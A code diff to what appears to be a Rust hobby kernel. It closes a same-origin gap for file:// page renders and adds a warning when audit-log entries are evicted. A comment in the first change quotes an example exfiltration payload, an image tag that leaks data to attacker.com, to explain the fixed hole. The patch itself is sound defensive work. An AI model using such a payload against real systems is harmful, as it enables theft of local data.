@@ -3244,6 +3244,14 @@ fn cmd_render(url: &str, parts: &[&str; MAX_PARTS]) {
             }
         }
     } else {
+        // STUMP #111 (H017): SOP for sub-resource fetches is gated on
+        // MAIN_ORIGIN being set. Pre-fix, file:// renders never set
+        // MAIN_ORIGIN, so a hostile local HTML file with
+        // `<img src="https://attacker.com/leak?…">` exfiltrated
+        // freely (check_subresource short-circuits to Ok when main
+        // is invalid). file:// gets treated as a "no scheme" synthetic
+        // origin so cross-origin checks fire on every external fetch.
+        crate::security::origin::set_main_origin(url);
         let mut path = url;
         if let Some(rest) = path.strip_prefix("file://") { path = rest; }
         while path.starts_with('/') { path = &path[1..]; }
@@ -4657,6 +4665,15 @@ fn cmd_audit(arg: &str) {
         }
     };
     crate::security::audit::dump_tail(n);
+    // STUMP #111 (audit C005): if the ring has overflowed,
+    // surface the evicted-count so the reviewer knows entries
+    // were silently dropped (potentially flood-eviction).
+    let evicted = crate::security::audit::evicted();
+    if evicted > 0 {
+        console::puts("  audit: WARNING ");
+        crate::kernel::mm::print_num(evicted);
+        console::puts(" entries evicted since boot — log may have been tampered with via flooding\n");
+    }
 }
 
 /// STUMP #103: serialize the audit ring and write it to BatFS as
